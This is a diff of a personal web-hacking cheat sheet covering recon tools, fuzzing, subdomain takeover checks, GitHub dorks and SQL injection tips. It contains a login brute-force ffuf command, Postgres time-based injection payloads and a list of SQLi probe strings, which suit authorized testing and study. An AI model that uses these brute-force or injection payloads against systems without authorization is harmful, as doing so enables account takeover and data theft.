@@ -1,5 +1,4 @@
 ##  ► web
-
 ### Tips
 
 - Test things under different environments, browsers.
@@ -14,83 +13,116 @@
 - Be aware of encodings. For example, browsers automatically URL-encode certain things.
 - The server might be Windows. Don't forget, in case of webshells, you might need different commands. 
 - For a newline, somtimes you need CRLF, individual CR or LF might not work, therefore use: `%0d%0a` (webhacking.kr - 38).
-- Don't forget to look into the sources, interesting things might not always be inline.
 
 ### Recon
-- Before running any tools, just roam around the website manually.
-- Look into SecLists / PayloadAllTheThings / FuzzDB.
+- Recon is a continuous process, keep scanning and diffing for subdomains.
+- Don't forget to look into the sources, interesting things might not always be inline.
+- If you have multiple files containing subdomains, merge them using: `$ cat file1.txt file2.txt | sort | uniq > out`
+- If you have a subdomain, look for further subdomains for it.
 
-#### Tools
-##### Amass
+#### recon.sh
+
+#### Wordlists
+- FuzzDB
+- SecLists
+- PayloadAllTheThings
+
+#### projectdiscovery.io
+- subfinder
+- nuclei
+- dnsprobe
+
+#### tomnomnom
+- gf
+- meg
+- httprobe
+- waybackurls
+- assetfinder
+
+#### Amass
+- Look into: `https://github.com/OWASP/Amass/blob/master/doc/tutorial.md`
+
 ```
 $ amass intel -whois -d DOMAIN
 $ amass enum -dir OUTPUT -passive -src -d DOMAIN
-$ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
-
 
 # Track differences between enumerations
-amass track
+$ amass track
 
 # Manipulate the Amass graph database
-amass db
+$ amass db
 
 # To see sources used
-amass enum -list
+$ amass enum -list
 ```
 
-##### Param [Miner / Spider / Arjun / Wayback]
-##### FFUF
-##### Nuclei
-##### gowitness
-
-#### GitHub dorks
-- `"example.com" ssh language:yaml`
-
-### Tools
-#### Burp Suite
-- Learn Burp hotkeys.
-- Plugins
-    - Autorize / Auto Repeater
-    - Flow / Logger++
-    - Turbo Intruder
-
 #### ffuf
-```bash
+```
 $ ffuf -w ~/wordlists/common.txt -u https://example.com/FUZZ
 $ ffuf -w ~/wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://www.example.com/login -mc all -fc 200
 $ ffuf -w ~/wordlists/common.txt -b "cookie1=value1;cookie2=value2" -H "X-Header: ASDF" -u https://example.com/dir/FUZZ
 ```
 
-#### sublist3r
-```bash
-$ sublister -d example.com
-```
-
 #### dnsrecon
-```bash
+```
 $ dnsrecon -n 8.8.8.8 -d example.com
 $ dnsrecon -d example.com -D ~/wordlists/namelist.txt -t brt
 ```
 
 #### gau
-```bash
-$ echo example.com | gau<br>
-$ cat domains.txt | gau</td>
+```
+$ echo example.com | gau
+$ cat domains.txt | gau
+```
+
+#### gowitness
+```
+$ gowitness single --url=https://www.google.com/
+$ gowitness file -s ~/domains.txt
 ```
 
 #### paramspider
-```bash
+```
 $ python3 paramspider.py --domain hackerone.com
 ```
 
-#### turbointruder
-```bash
-https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
+#### Arjun
+```
+$ python3 arjun.py -u http://example.domain.com/endpoint --get
 ```
 
-### Bugs
-#### GraphQL
+#### Burp Suite
+- Learn Burp hotkeys
+- Plugins
+    - Autorize / Auto Repeater
+    - Flow / Logger++
+    - Turbo Intruder
 
+#### paraminer
+`https://github.com/portswigger/param-miner`
+
+#### turbointruder
+`https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack`
+
+#### BurpBounty
+`https://github.com/wagiro/BurpBounty`
+
+### Bugs
+#### postMessage
+
+- https://twitter.com/s0md3v/status/1256511604046340096
+- https://twitter.com/xdavidhu/status/1262317923311509505
+
+#### Subdomain takeovers
+```
+$ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain | httprobe -prefer-https | nuclei -t nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml
+```
+
+#### GitHub dorks
+- `"example.com" ssh language:yaml` [source](https://twitter.com/ADITYASHENDE17/status/1262747235785138178)
+- `http://chat.googleapis.com/v1/rooms` [source](https://twitter.com/uraniumhacker/status/1262193407616679936)
+
+#### GraphQL
 - `https://graphql.org/learn/`
 
 #### SQLi
@@ -115,6 +147,22 @@ https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-at
 - Use `LIKE BINARY` for case-senstivie blind sqli matching.
 - For postgres time-based, `||pg_sleep(10)`
 - For postgres time-based conditions `'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
+- To test for SQL injection (can be put in burp intruder): [source](https://twitter.com/pwntheweb/status/1253224265853198336)
+```
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'   <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+```
 
 #### PHP
 
@@ -173,7 +221,6 @@ var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
 - Redirect output to a file you can read using your browser.
 
 ### Resources
-
 #### Courses
 
 - [Web Security Academy](https://portswigger.net/web-security)
